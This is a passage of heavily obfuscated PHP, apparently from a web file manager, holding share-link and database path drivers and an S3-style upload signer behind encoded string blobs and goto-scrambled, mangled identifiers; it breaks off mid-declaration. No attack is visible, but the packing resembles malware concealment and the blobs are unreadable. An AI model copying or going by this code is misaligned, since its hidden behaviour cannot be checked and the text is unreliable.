\x75\x93\xf0\x19\x18\x1b\xf6\x34\xc4\x46\x8e\x92\xb4\xc9\x36\x20\xc0\x26\xe\x98\x18\x65\xe7\x61\xc4\x15\x3\xc7"."\xb2\x1a\xea\x86\x6b\x6a\x47\x3c\xd\xc3\x6b\x62\xb1\x11\x1c\xac\x47\xb0\x36\xc\x8f\x45\x3c\xd\xf5\xae\xc5\x47\x79\x7\x75\x4b\xc6\xa7\x9e\x8f\xa7\xc5\x81\x2e\x67\x46\x60\x5\x7e\xb8\x8f\x45\x16\x1d\xed\x92\x88\x9\x84\xac".base64_decode('TzvgR0xZ8qtm5woS2WLXX3NbZY1yCmFLSpGtfSTIrK4KQrPeqUzLo47Z0qh0IFHNYd7rcP4m1c4=').strrev('Ïs-í¡i~ÁâÖ:¤P&¡µ¸Ó£Z  €ø¼Ä¥äšòEuJŒ/K–üˆ]—-œ')."\xdb\xa8\xca\x3e\xa4\x61\x8b\xbd\x56\x42\xbb\x1a\x7d\x8a\xec\x6b\x98\xe3\xd\xa1\x28\x3e\x91\x80\x1e\xc0\x7d\x1c\x2f\xfb\x20\xb7\x12\xce\x4a\xdb\x51\xa1\x3\x43\xa4\x9\xa1\x85\xc5\xa2\x4c\x44\x4a\xaa\x5\x7c\x5f\x93\xa2\x27"."\xe3\xa8\xe3\xe1\xdb\x3c\x34\x38\x80\x9d\xa2\x61\x4e\x10\x67\x67\xa8\x12\x28\xd0\x1f\x88\x47\x2\xab\xfd\x15\x9\xd8\x87\x6f\xf5\x14\xb4\xde\x47\x3\x4c\xfc\x91\xe0\xfd\x21\xe2\x87\xcc\x1\x1f\xec\x5f\xd6\x1f\x1a\xaa\x86\x1a"."\355\33\20\262\204\224\324\351\353\217\306\245\75\51\335\254\240\55\27\337\255\60\55\366\244\231\154\151\116\360\151\306\375\163\61\131\36\146\12\133\363\205\315\377\244\233\53\365\263\375\116\227\160\325\1\331".base64_decode('yMErVIE4LoEM8imOnOxSqp7h8A2VqeattGaWHU8m9LzKvJDm2Ldz3IwNey9iHl+IyRmTDOS76wI=')."\277\0\4\73\57\23\245\232\51\154\224\44\235\331\345\355\260\226\221\243\101\203\353\354\221\325\274\112\21\370\275\32\311\266\4\157\122\174\111\273\50\277\213\43\75\51\216\142\322\363\356\222\175\235\273\111".strrev('âÅCNKÜ)äq<Îcg6EO«˜êŒÊYà˜¤|ÜS±y:W£ï•èØ«Å5@”¶di’ÓŠ-á').strrev('EÙ©ç³vnş³e}®\'A°qöÉ4z’IùT¥ª» ÖB°±NL¬:¶hY›ä,äËE…').base64_decode('tVmDznU3KxJ5Yd4jUQQ9jeDdKKwwswLHwE4HJNMkYeVHH6HhQ0teq+ExU7IA01Js6MhrL1XXEgo=')."\44\317\301\124\265\221\242\235\205\223\273\34\56\37\313\20\320\224\167\246\303\303\360\122\145\234\31\114\352\2\117\176\366\236\144\21\165\26\236\62\21\310\240\117\315\113\235\40\34\251\321\247\154\230\203\117"."\x5f\x2a\x55\xe\x8e\x1a\x1c\x58\xe9\x8c\xcd\xc3\x5d\x93\x82\x6b\x74\xb4\x1\x8d\x4\x42\xfd\x75\xf5\x58\xa2\x72\xd8\xee\xf7\x4d\x71\xe7\xd5\x68\xd4\xc8\x9a\xdd\xa7\x4e\x8a\x41\xe1\x11\x96\xca\x69\xd2\x72\x44\xa8\x6b\x41\x47".strrev('"w{ŞPÁ*ONDÏí²-½ÆÙ¾5éò4.^)ìfk*ßÄİ`ê^½š`h³‚ZXân')."\xcb\x94\x8c\x66\x2b\x42\xe8\x21\x97\x14\xce\x59\x4e\x1c\x2f\x90\x43\x3d\x46\xe4\x9\xa6\xc2\x42\x82\x6e\x72\x0\xe2\x76\xf8\xbb\xe1\x3b\x12\xd9\xd\x23\x2e\xa8\xa2\x60\x3a\xea\x72\x71\xf8\xf4\xc4\x9d\xe2\xd6\xad\x65\xb8\x4c"."\110\250\310\41\177\137\312\203\167\64\116\276\100\300\260\327\161\226\63\245\341\173\200\352\337\56\126\371\56\340\147\305\331\211\224\101\317\227\164\113\27\123\236\165\325\224\214\137\321\227\244\51\22\2\366\176"."\x25\x4c\xbe\x79\xb7\xf2\xef\x54\x98\x22\x8b\x38\xc5\x81\x27\xb1\x24\xa3\x57\x3a\x24\xf2\x4b\x70\xd2\x6a\x80\x1d\xe\xa0\xa5\x56\xe8\xba\x15\x98\xff\x13\xb8\x5e\x67\xb4\x1\x51\xe9\xa6\xda\xf1\x64\x1c\x24\xa3\x9d\xa0\xaa\x33"."\122\247\141\51\107\70\320\323\33\235\256\270\12\154\75\45\336\203\53\253\214\236\142\322\42\367\353\214\144\104\122\36\325\332\161\324\11\53\46\10\336\21\350\162\221\227\274\204\123\121\22\104\362\244\13\37".strrev('Âl{ª„Ÿìò|hG¹ËÇ]ä‘u‰ClM9rŞ£E3¾œPaI¾`§– İ+L1%È©\'¤¸'."\n".'‘o')."\140\141\154\212\63\262\207\244\130\145\151\264\334\107\352\250\103\106\256\304\105\151\212\260\211\347\10\112\273\322\110\134\53\120\175\32\162\277\263\220\171\177\307\215\247\166\312\344\151\57\177\256\140\73\154\230"."\173\165\113\274\342\100\304\4\261\35\302\262\227\221\233\252\0\70\214\344\203\254\32\334\215\47\66\43\311\247\15\271\145\204\145\371\21\153\160\221\20\265\215\166\341\223\152\173\200\20\101\120\53\151\316\354"."\323\226\145\225\363\172\316\247\35\214\221\104\44\72\42\106\251\222\27\164\366\213\335\317\160\371\22\127\105\22\104\300\152\51\6\277\214\7\226\27\215\306\246\23\264\102\30\1\342\150\105\142\237\46\324\320"."\240\256\56\301\326\351\155\64\2\41\66\100\54\161\44\212\146\151\322\360\123\165\364\60\165\32\350\241\36\53\230\334\221\321\271\147\120\7\32\220\73\332\42\114\353\133\5\326\67\352\147\245\230\17\120\137"."\xf0\xe\xa8\x29\x89\xd7\xb2\x43\x59\xea\x51\x46\xf8\xec\x6\x74\xf4\xb5\x1\xea\x42\x6\x26\xa4\x5c\x24\xf3\xd4\x43\x7e\xb0\x0\x8e\xe8\x95\xdb\x36\x7b\x2b\x3d\xfb\x60\xa7\x86\x5c\x7c\x10\x4e\x40\xc7\xc\x22\xc5\x7a\x64\xf9".base64_decode('FxCUhQqbL5btoCMsciBpxEUChDhlIak61EGcBIUPGHlxkI8d7lH46dLSXHzEcbHPkF+7YE2ghFE=')."\xf1\xd\xf2\x8b\x37\xd1\x2e\xda\x46\x17\x27\x17\xdd\xa\x12\xf5\x42\x2b\x42\x5\x2c\x97\x70\xbb\xee\xa2\x67\xf3\xc4\x88\x45\x30\x7\xd1\x1d\x8c\xec\x33\x9a\xf8\x20\xae\x61\x54\xfe\xb8\x43\x92\x2b\x17\xe2\x78\x2f\x95\x65\x8"."\227\367\144\324\250\164\210\40\134\31\345\213\71\341\63\12\105\234\2\54\25\355\231\53\211\57\151\156\321\314\272\210\152\254\213\275\1\347\242\257\222\272\34\105\220\12\305\155\251\301\134\232\52\33\256\212"."\x8f\xfd\x17\xa5\x83\xcb\x58\x22\xd0\x22\xd1\x80\x7a\x98\xa0\x49\x6d\xe4\x62\xa3\x3a\x9a\xee\xa0\x4b\xb4\x7b\x14\x47\xc6\xf4\x4d\xcb\x42\x39\xa3\x5c\x95\x4b\x35\xb7\xcc\x39\x46\xde\x2f\x8a\x61\x14\x8e\x6b\xd8\x6b\xb9\xf4\x87".base64_decode('HY1xwlCcdKawhzTlmU0SnZ5v4XVTiQuW8a//ajr4qombNJN0gsVLlrqg2lf+/+vh9GAG+8AuLmM=')."\112\202\241\54\302\212\332\323\247\25\377\373\357\63\201\115\165\372\260\42\251\316\251\57\35\73\150\166\10\33\272\303\230\110\322\276\170\67\111\132\337\160\131\76\131\204\255\24\301\331\314\21\72\116\304\321"."\273\160\223\101\210\304\101\60\322\13\251\262\337\164\122\120\224\64\162\272\242\311\36\20\352\13\24\103\56\313\211\323\67\137\17\167\205\217\57\22\105\25\160\114\260\11\333\20\51\266\344\244\35\63\226\20"._kodDe('MJ5tgyJ2YBaCmhwSfD2o74MHU4gudjVjrBo3Z/L2N5IOgI8NEZTGjHiv4Ddy0qdPZYI/+AFiXmeG')."\304\53\56\375\254\304\277\5\253\26\241\176\246\230\217\43\322\201\14\21\343\170\342\250\54\341\341\127\177\234\102\15\257\5\341\62\325\150\226\126\2\23\42\54\42\44\310\70\33\326\334\45\6\263\70\17"."\xf4\x9e\x73\xa6\x92\x6\x7d\xc9\x4a\x84\x8b\xe3\x5e\x99\x21\x22\xfb\x88\x97\x56\x3a\x99\x99\xee\x25\xa7\x2\x65\xb9\x1c\x31\x88\x8\x11\x8b\xe8\x41\x4b\x77\x3a\x24\xce\x9d\x6d\xb2\x27\x9c\xd8\xcb\x4e\x2a\xf7\xda\x82\xdd\xd1".base64_decode('8H0NPfMBlGxWMG75yY5sQjU9iMLGbObCq1pEbmUVcZyJBKIBeT05VsVlD+5/rCMj8UxppalAEzw=')."\5\55\110\134\267\215\205\210\354\212\145\24\170\16\333\361\116\102\210\337\371\326\203\273\267\221\45\214\41\340\131\310\16\223\144\136\340\0\125\160\220\250\203\171\73\200\125\210\0\73\102\147\364\340\310\201"."\x9d\x3\x75\x48\x42\x70\xa5\x87\xa6\xca\xd4\x70\x25\xf\xe3\xd3\x50\xc6\x13\x7c\x9e\xc6\xf1\xe3\xc6\xce\xd\xa5\xfc\x35\x7a\x35\x8b\x37\x4d\x61\xbc\xbf\xf1\x94\x15\xcf\xe7\x4d\xd5\xb9\xa2\x5b\xf4\x18\x4e\x96\xfd\x51\x48\xae".base64_decode('O5tsA6ZBVmAnlO/CJBMhSX0nUs6ubMPRC0hglo7I6bOH9GFs/GYbYlpKZLCvjjixxgDiKoc8nbU=')."\26\4\202\265\312\14\105\372\217\76\240\126\207\223\161\41\153\225\100\277\170\302\266\136\21\17\177\311\257\157\343\63\244\156\203\17\275\323\7\77\166\220\353\244\363\105\325\320\222\206\151\111\150\322\373\101".base64_decode('y7E3cRrs0/Ps6QcgX5Ydul5+xt5ZPhrpiO0YE/H6ePmr42SLRXdNjs0TqMnIIOmYB+uCO/2jkkQ=').base64_decode('AmZvI0IJ0lm189aAP+5cwZuKelBKJrnYk1zoF7vnDwhnCSSZnq75SipXISnPNeiQQKU7hiShQLE=').base64_decode('TSAZE6iW5B9fQS/PYY/qZqpDz6fK8Yv5BIcKdDQYHdXASEYS7LkMLq0kgkGqJXEGLWTCVKpbLVU=').base64_decode('QeWmzRyKIByVCDzSKyLCsa42IX8d8NKV6whGrISKV0bK20XmDYfDsX9e8noG5CZA9Fl67taOFmU=')."\32\44\243\232\22\376\356\150\35\371\366\115\174\322\371\30\12\107\343\302\30\302\41\112\342\156\7\264\314\267\57\76\311\142\53\152\131\22\354\35\245\342\253\156\61\35\244\20\224\212\223\157\36\246\315\20".base64_decode('qf4RQa/OLo6U3XeUsVCBzBYzwzEgEoPljQXMsJzoqGL5cBNBX9AqBebI+RJN8zmTKL5W1iI5Q3k=').base64_decode('a2kOs6LPIE/1T5d/gHVZ+b2fKEQ6bau4lIwaVfLQGlXNRpNwTiGtOfLKe1qRDUGL1jQ1rGw/mR0=').base64_decode('Za2HOgu/2hLqdF1SFbnyczD+5dhkn1q9FlX31NPVoirytLUQ2GVXiNXYHEupwtjEjV8lCxVpVe4=').strrev('ÂèE3Ë˜·Œƒ ,(Î»õé>NÛŠaåÁ–CŞrÑªá×êÌËå’*ñÔ;'."\r".'}x™i')."\x13\x20\xb6\x4a\xf4\x99\xe5\xfd\xc7\xc4\xb8\x32\xa7\xb8\x8c\x3c\xf3\x45\xc9\x11\x6b\x55\xaf\xba\x2e\xbc\xc3\xad\xdc\x42\x66\x99\x3f\x2b\xd9\xe7\x30\xdd\x67\x18\xb6\x9e\x94\xd4\x20\x30\x50\x76\x9b\x4b\xd3\xd9\x47\xb2\xe2\x24"."\xa\x64\x0\x7a\xbb\xd5\x25\x6b\xf5\x92\xda\xea\xf8\x8d\x73\x7e\x83\xe8\xb8\x2e\xab\x92\xee\x11\x27\x93\xe\xa7\xcc\xe4\xad\x2c\x6e\xa9\x4d\x17\x65\x38\x9b\xa5\x37\x9\x44\x63\x5\x20\x1d\x53\x78\x9b\xe4\xa2\x6b\x1d\x4d\x8e"."\x18\xa6\x8d\x2d\xb8\x11\x3f\x2e\x90\xdf\xe\xc3\xb6\x19\x9b\x40\x92\x2d\xc1\x24\xa2\x1b\x71\x10\x23\xdd\x8f\xa2\x90\x78\x8c\x14\xf7\x2d\x39\x16\x26\x84\x4a\x18\xa\x9\xc2\x9d\x6\xde\x52\x46\x34\x9a\x4a\x98\x94\x23\x82\x8f"."\x9b\x79\x24\x5c\x79\xae\xdc\x5d\x2c\xbb\x44\x11\x0\xb4\x19\x4c\x18\x93\x40\x4\xe4\x99\x13\x51\x1f\x7c\x2e\xc\xdd\x52\x2e\x9e\x9\xc7\xfe\x40\x85\xf2\x6d\x2f\x51\xb1\xb2\xbc\x34\xc5\xb\xea\xd8\x6e\x52\x86\x1b\xde\xc2\xe3"."\352\130\220\75\105\46\26\167\61\371\145\45\300\61\232\50\202\76\270\114\16\174\360\73\345\376\225\201\110\64\122\221\64\340\213\104\206\102\341\56\252\322\131\221\114\162\111\127\353\25\111\3\275\241\376\351"."\xd2\xfc\x7d\xbe\x40\xb0\x22\xd\x5f\xb5\x63\x45\x53\xf6\x5c\x23\x4d\xa\xc\x90\x5a\xfa\x82\x41\xa6\xd7\x55\x59\x8b\x40\xe7\x32\x51\x13\x72\xc3\x24\xce\x43\xb\xa3\x6\x3b\x5e\x2c\xd3\x39\x61\xc7\xc7\x11\x95\x4d\x13\xcc\xfc".base64_decode('+YZWCms5fvgkFec8BZCH3GLPifJAoWIHIS30+Gq8HwoLM0+K+O1qPv25NEsaJ+vYiPs0j+PeTYI=')."\223\211\103\230\220\104\220\362\32\114\0\240\23\132\166\357\121\326\231\322\172\137\171\163\106\40\242\103\160\275\227\62\117\12\353\214\204\164\242\112\371\224\203\103\311\312\15\64\354\110\216\253\151\207\357\143".strrev(''."\0".''."\0".'ÁõJÏ'."\0".'ÿö½Å¿ºY¬åÙ×aš¶3gbøùaÉLuˆ†‚ÁŸ'."\0".'ÍTF¢wÄ').base64_decode('').base64_decode(''), 10, -8))); goto CÕµøÉµÓ²; eâõšÉ¼ªÇ: if ($_SERVER[$_SERVER[¼][754]] != $_SERVER[$_SERVER[¼][2494]]) { goto aªİÒ¾àÖ¥; dô÷ÃÄµ: $Fë ‰£ÛãÚ($_SERVER[$_SERVER[¼][776]]); goto f”òÉ†è†ô; aªİÒ¾àÖ¥: $a½ÍÜ”‘‡… = $_SERVER[¼][755]; $a“‚Ù¡º× = $_SERVER[$_SERVER[¼][756]] . $_SERVER[¼][757]; $d—èàÆä˜¶ = $a½ÍÜ”‘‡…($a“‚Ù¡º×); goto b‘£Œ„½ø; b‘£Œ„½ø: $c²‡¨¦ï¹È = explode($_SERVER[¼][214], $d—èàÆä˜¶); if (count($c²‡¨¦ï¹È) < $_SERVER[¼][544]) { $f…‚·»Õä® = $_SERVER[¼][758]; $f…‚·»Õä®(); } $Fë ‰£ÛãÚ = $_SERVER[¼][759]; goto dô÷ÃÄµ; f”òÉ†è†ô: } goto F§¤ïæÕ„‘; B¨‚¢™ĞŠÃ: class PathDriverDriverShareItem { public function __construct($Bêö×ç·Ş) { $this->pathParse = $Bêö×ç·Ş; } public function __call($c¼’¹˜ß¯, $d¦åÏõì•ç) { $c…Ú¤å¹ìŠ =& $_SERVER[¼]; if (method_exists($this, $c¼’¹˜ß¯)) { return; } $ağò¾è£çÀ = call_user_func_array(array($c…Ú¤å¹ìŠ[1110], $c¼’¹˜ß¯), $d¦åÏõì•ç); $fÅ°˜áÛ¶Ş = array($c…Ú¤å¹ìŠ[1111], $c…Ú¤å¹ìŠ[1112], $c…Ú¤å¹ìŠ[1113], $c…Ú¤å¹ìŠ[1114], $c…Ú¤å¹ìŠ[486], $c…Ú¤å¹ìŠ[488], $c…Ú¤å¹ìŠ[1115], $c…Ú¤å¹ìŠ[91], $c…Ú¤å¹ìŠ[1116], $c…Ú¤å¹ìŠ[1117]); if (in_array($c¼’¹˜ß¯, $fÅ°˜áÛ¶Ş)) { $ağò¾è£çÀ = $this->getPathOuter($ağò¾è£çÀ); } return $ağò¾è£çÀ; } public function copy($b®—¼„µÓ®, $Fñ… ’®ğ, $CÉÆİßáìñ = false) { return $this->copyMove($b®—¼„µÓ®, $Fñ… ’®ğ, $CÉÆİßáìñ, $_SERVER[¼][486]); } public function move($F±İ¿Àç¨Æ, $Dë¥÷Û‚æÆ, $F½çµ¦åµŞ = false) { return $this->copyMove($F±İ¿Àç¨Æ, $Dë¥÷Û‚æÆ, $F½çµ¦åµŞ, $_SERVER[¼][488]); } private function copyMove($cµÊùÆÖ¢º, $C°ŞÓ½¾Ÿ, $B‹¢„»ÚŞ, $Bğ©ßİã“×) { goto bÚ­‚¾ğª; bÚ­‚¾ğª: $dÏ‚ïÉíºÏ =& $_SERVER[¼]; $e‹îÚˆÎø = $C°ŞÓ½¾Ÿ; $bÔçÕ©Èòæ = IO::driverMake($C°ŞÓ½¾Ÿ); goto FºãŞØĞ; FºãŞØĞ: if ($bÔçÕ©Èòæ->pathParse[$dÏ‚ïÉíºÏ[991]]) { $C°ŞÓ½¾Ÿ = $bÔçÕ©Èòæ->pathParse[$dÏ‚ïÉíºÏ[991]]; } else { $C°ŞÓ½¾Ÿ = $e‹îÚˆÎø; } $D´„¥»… = IO::copyMove($cµÊùÆÖ¢º, $C°ŞÓ½¾Ÿ, $B‹¢„»ÚŞ, $Bğ©ßİã“×); $D´„¥»… = $this->getPathOuter($D´„¥»…); goto FËÙ½õ¯‹õ; FËÙ½õ¯‹õ: return $D´„¥»…; goto F÷•†°·Ã¬; F÷•†°·Ã¬: } public function pathFather($a¥ô¦ù†Œù) { return get_path_father($this->pathParse[$_SERVER[¼][75]]); } public function iconvSystem($DËêÁ¥½ö) { return $DËêÁ¥½ö; } protected function infoParse($eëåÌ—±¨¯) { $B‡±´ò ôõ =& $_SERVER[¼]; $f¶¦’Ï”ª¡ = $this->pathParse[$B‡±´ò ôõ[435]][$B‡±´ò ôõ[1011]] . $this->pathParse[$B‡±´ò ôõ[1004]]; $B…®˜šî”” = IO::info($f¶¦’Ï”ª¡); $F°²ëµ¤ïÜ = $this->pathParse[$B‡±´ò ôõ[435]]; return Action($B‡±´ò ôõ[1109])->_shareItemeParse($B…®˜šî””, $F°²ëµ¤ïÜ); } public function listAll($Aø¤¹™Â®É) { $eìÅô³™¼á =& $_SERVER[¼]; $c›À‚õğñÍ = IO::listAll($Aø¤¹™Â®É); $eÏÆÂ·Ş“Š = $this->pathParse[$eìÅô³™¼á[435]]; foreach ($c›À‚õğñÍ as &$Fì‹–˜Ù) { check_abort(); $Fì‹–˜Ù = array_merge(IO::info($Fì‹–˜Ù[$eìÅô³™¼á[75]]), $Fì‹–˜Ù); $Fì‹–˜Ù[$eìÅô³™¼á[388]] = Action($eìÅô³™¼á[1109])->_shareItemeParse($Fì‹–˜Ù, $eÏÆÂ·Ş“Š); } return $c›À‚õğñÍ; } public function getPathOuter($A¡Œ©¥©Œ) { goto cš¾¿Ü°æ; Eé†«÷Û™: if (substr($dâßŞğ©Ã´, 0, strlen($e„ÀãÆ¶Ü)) != $e„ÀãÆ¶Ü) { return !1; } return $this->pathParse[$CÕâ‚‚ËñË[1005]] . $CÕâ‚‚ËñË[8] . ltrim($dÚğ¦ƒêÄ´, $CÕâ‚‚ËñË[8]); goto a®‡šœŒ†; BÛğ«ö¤ô: $dâßŞğ©Ã´ = KodIO::clear($A¡Œ©¥©Œ); $e„ÀãÆ¶Ü = KodIO::clear($this->pathParse[$CÕâ‚‚ËñË[435]][$CÕâ‚‚ËñË[1011]]); $dÚğ¦ƒêÄ´ = substr($dâßŞğ©Ã´, strlen($e„ÀãÆ¶Ü)); goto Eé†«÷Û™; cš¾¿Ü°æ: $CÕâ‚‚ËñË =& $_SERVER[¼]; $Eø™•–•›’ = KodIO::parse($A¡Œ©¥©Œ); if ($Eø™•–•›’[$CÕâ‚‚ËñË[29]] == KodIO::KOD_SHARE_ITEM) { return $Eø™•–•›’[$CÕâ‚‚ËñË[75]]; } goto BÛğ«ö¤ô; a®‡šœŒ†: } public function getType() { $dÉ‹íƒ˜¨à =& $_SERVER[¼]; $A…Í¨Úİóé = str_replace($dÉ‹íƒ˜¨à[71], $dÉ‹íƒ˜¨à[33], get_class($this)); return strtolower($A…Í¨Úİóé); } public function isTypeObject($E˜öö©Í›…) { return IO::isTypeObject($E˜öö©Í›…); } public function info($E¡¹ó„›¯) { return $this->infoParse($E¡¹ó„›¯); } public function infoAuth($C´Ã†¯¥é°) { return $this->infoParse($C´Ã†¯¥é°); } public function infoWithChildren($cÉÄÂº‰Á©) { return $this->infoParse($cÉÄÂº‰Á©); } public function infoFull($AÜ§œêæƒ×) { return $this->infoParse($AÜ§œêæƒ×); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($A’Ìô´İÙ“) { $this->pathParse = $A’Ìô´İÙ“; } protected function infoParse($f¡“Ò˜ˆ¾) { $CãŠ¦—íÄ =& $_SERVER[¼]; return Action($CãŠ¦—íÄ[1010])->sharePathInfo($this->pathParse[$CãŠ¦—íÄ[75]], !0); } public function listPath($e©ËÖ“ÅÈ­, $Fóã‹­‡ğ² = false) { $B¸¹³Çã =& $_SERVER[¼]; $dÇŸÀÕ²‰ = IO::listPath($e©ËÖ“ÅÈ­, $Fóã‹­‡ğ²); foreach ($dÇŸÀÕ²‰ as $f‰ÁÎŒÅÚá => $AîÊÇÇÖè²) { if (!in_array($f‰ÁÎŒÅÚá, array($B¸¹³Çã[73], $B¸¹³Çã[74]))) { continue; } foreach ($AîÊÇÇÖè² as $b¼ğœ¾…à• => $dÇ—Î™¾øô) { $dÇ—Î™¾øô = Action($B¸¹³Çã[1118])->parsePathChildren($dÇ—Î™¾øô, array($B¸¹³Çã[384] => $e©ËÖ“ÅÈ­)); $dÇŸÀÕ²‰[$f‰ÁÎŒÅÚá][$b¼ğœ¾…à•] = Action($B¸¹³Çã[1010])->shareItemInfo($dÇ—Î™¾øô); } } return $dÇŸÀÕ²‰; } public function listAll($b‡”…˜ãİÎ) { $eÊÔï®Ã÷ğ =& $_SERVER[¼]; $d½ƒæŸÕ· = IO::listAll($b‡”…˜ãİÎ); foreach ($d½ƒæŸÕ· as &$E©˜±Ì¥µó) { $E©˜±Ì¥µó = array_merge(IO::info($E©˜±Ì¥µó[$eÊÔï®Ã÷ğ[75]]), $E©˜±Ì¥µó); $E©˜±Ì¥µó[$eÊÔï®Ã÷ğ[388]] = Action($eÊÔï®Ã÷ğ[1010])->shareItemInfo($E©˜±Ì¥µó); } return $d½ƒæŸÕ·; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($côè¶¾ô©¿) { parent::__construct($côè¶¾ô©¿); $this->signatureVersion($_SERVER[¼][197]); } public function uploadFormData($AŸ…™Ü•Ä¾, $eª¢Ÿ´”ƒÁ = 3600) { goto bºæ…Ô¢®Æ; F„‰ÉÜÈ²: $B©§Å°Óæ£ = array($this->accessKey, $DÒ«…‚÷¡Í, $this->region, $cî’Ä¡òŒ, $eÃÄÙšÎ£); $D†‚ÄÑÏÖä = implode($dä³®İª[8], $B©§Å°Óæ£); $bÜéÀİ¨ğ¸ = array($dä³®İª[1088] => gmdate($dä³®İª[1087], strtotime($dä³®İª[1122])), $dä³®İª[1089] => array(array($dä³®İª[1091] => $this->bucket), array($dä³®İª[1090] => $B…»±­ã½), array($dä³®İª[1092], $dä³®İª[1093], $dä³®İª[33]), array($dä³®İª[1092], $dä³®İª[1123], $dä³®İª[33]), array($dä³®İª[1092], $dä³®İª[1124], $dä³®İª[33]), array($dä³®İª[1094] => $D×Ù™‚ˆÅ), array($dä³®İª[1125] => $D†‚ÄÑÏÖä), array($dä³®İª[1126] => $B‡’“ö‹Å†), array($dä³®İª[1127] => $d§ßÂµº¾), array($dä³®İª[1128] => $D„§„ß£›ò))); goto f¦×‡ÃÔàŒ; d¹ªËÉ³´²: $cî’Ä¡òŒ = $dä³®İª[59]; $d§ßÂµº¾ = gmdate($dä³®İª[1120]); $DÒ«…‚÷¡Í = gmdate($dä³®İª[682]); goto cƒÃáØÇÀ ; cƒÃáØÇÀ : $eÃÄÙšÎ£ = $dä³®İª[1121]; $D„§„ß£›ò = $eª¢Ÿ´”ƒÁ . $dä³®İª[33]; $D×Ù™‚ˆÅ = $dä³®İª[1086]; goto F„‰ÉÜÈ²; bºæ…Ô¢®Æ: $dä³®İª =& $_SERVER[¼]; $B…»±­ã½ = $dä³®İª[182]; $B‡’“ö‹Å† = $dä³®İª[1119]; goto d¹ªËÉ³´²; f¦×‡ÃÔàŒ: $dŒªó™˜í = base64_encode(json_encode($bÜéÀİ¨ğ¸)); $A‹øŞ²±ˆ = hash_hmac($dä³®İª[1129], $DÒ«…‚÷¡Í, $dä³®İª[1130] . $this->secret, !0); $d¥° âó÷ = hash_hmac($dä³®İª[1129], $this->region, $A‹øŞ²±ˆ, !0); goto dÌ¥æÏ¬Ó—; dÌ¥æÏ¬Ó—: $F‹•ğ‚ÉŠ… = hash_hmac($dä³®İª[1129], $cî’Ä¡òŒ, $d¥° âó÷, !0); $C¹à‡àÂ‡Ä = hash_hmac($dä³®İª[1129], $eÃÄÙšÎ£, $F‹•ğ‚ÉŠ…, !0); $BÔíˆƒ—¤ñ = hash_hmac($dä³®İª[1129], $dŒªó™˜í, $C¹à‡àÂ‡Ä); goto DæˆÏ©Í‘š; DæˆÏ©Í‘š: $EÃÅÇÄÀÅ¢ = array($dä³®İª[196] => $dä³®İª[33], $dä³®İª[1131] => $dä³®İª[33], $dä³®İª[1090] => $B…»±­ã½, $dä³®İª[1094] => $D×Ù™‚ˆÅ, $dä³®İª[1098] => $dŒªó™˜í, $dä³®İª[1132] => $D†‚ÄÑÏÖä, $dä³®İª[1133] => $B‡’“ö‹Å†, $dä³®İª[1134] => $d§ßÂµº¾, $dä³®İª[1135] => $D„§„ß£›ò, $dä³®İª[1136] => $BÔíˆƒ—¤ñ, $dä³®İª[166] => $this->getHost()); return $EÃÅÇÄÀÅ¢; goto B‚©ÆÙëàí; B‚©ÆÙëàí: } } goto a§ Ã×ŸÂ; a«Š¢·ªô: $_SERVER[$_SERVER[À Ç][52]] = ("\x39\x33\x38\x34"."\x30\x31")+0;$_BwtQ="FjBYWp8RKn3tI9HfS7c6HWDRxtPGyNeyIdaCJGuT6TbKibewCJkvJGWBqnzftk6AVMh9KGjXU8eX";; stream_wrapper_register($_SERVER[À Ç][53], $_SERVER[À Ç][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($FØßöæ¶”, $Eğ–ƒ™î´á) { $bÃ¯í¯ù =& $_SERVER[¼]; if (isset(self::$_methodList[$FØßöæ¶”])) { return @call_user_func_array(self::$_methodList[$FØßöæ¶”], $Eğ–ƒ™î´á); } else { if (method_exists($this, $FØßöæ¶”)) { return call_user_func_array(array($this, $FØßöæ¶”), $Eğ–ƒ™î´á); } else { think_exception(__CLASS__ . $bÃ¯í¯ù[4] . $FØßöæ¶” . $bÃ¯í¯ù[5]); } } } public static function __callStatic($eÚÕè­ğİµ, $b‹‚àæ›ä‡) { if (isset(self::$_methodListStatic[$eÚÕè­ğİµ])) { return call_user_func_array(self::$_methodListStatic[$eÚÕè­ğİµ], $b‹‚àæ›ä‡); } else { if (method_exists(self, $eÚÕè­ğİµ)) { return call_user_func_array(array(self, $eÚÕè­ğİµ), $b‹‚àæ›ä‡); } else { show_json("{$eÚÕè­ğİµ}\50\51\40\156\157\164\x20\x65\x78\x69\x73\x74\73", !1); } } } public static function addMethod($d›À×¶œŞ, $e‡½»˜«„Æ) { self::$_methodList[$d›À×¶œŞ] = $e‡½»˜«„Æ; } public static function addMethodStatic($bÆ®Õšß±æ, $aª–ÈÄ¹£¾) { self::$_methodListStatic[$bÆ®Õšß±æ] = $aª–ÈÄ¹£¾; } } goto F™³¶Ùâ; Aª¤ùÉãÃ«: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($fÀù™Šİ) { $this->pathParse = $fÀù™Šİ; $this->model = Model($_SERVER[¼][1103]); } public function getPath($f·°šéáÑà) { return trim($f·°šéáÑà, $_SERVER[¼][8]); } public function pathFather($f¾ëËŠ¶‘Ú) { $DÃ£ğ®«ÇÍ = $this->parse($f¾ëËŠ¶‘Ú); $DÃ£ğ®«ÇÍ = $this->infoSimple($f¾ëËŠ¶‘Ú); return $DÃ£ğ®«ÇÍ ? $DÃ£ğ®«ÇÍ[$_SERVER[¼][457]] : !1; } public function getPathName($c‰ƒäÄ¨äÄ) { $E¡Èƒ¾œ¬ = $this->infoSimple($c‰ƒäÄ¨äÄ); return $E¡Èƒ¾œ¬ ? $E¡Èƒ¾œ¬[$_SERVER[¼][28]] : !1; } public function getPathOuter($CÙ®¾Ç’–) { if (!$CÙ®¾Ç’–) { return $CÙ®¾Ç’–; } $Eù’õäÎ‡­ = $this->parse($CÙ®¾Ç’–); return KodIO::make($Eù’õäÎ‡­[$_SERVER[¼][364]]); } public function copyFolderFromIO($fùÏ×¼¦¶è, $bÒ¾îŞ“®‚, $FÒø™¼Şã‰, $c—¤¦¿º…–, $D±ğ¦’¯àµ) { $BÅÉ¶à¼Ê = $this->model->copyFolderFromIO($fùÏ×¼¦¶è, $bÒ¾îŞ“®‚, $FÒø™¼Şã‰, $c—¤¦¿º…–, $D±ğ¦’¯àµ); return KodIO::make($BÅÉ¶à¼Ê); } public function isParentOf($A†ØØ¶…, $B…ˆæÁÀâ×) { return $this->model->isParentOf($A†ØØ¶…, $B…ˆæÁÀâ×); } public function 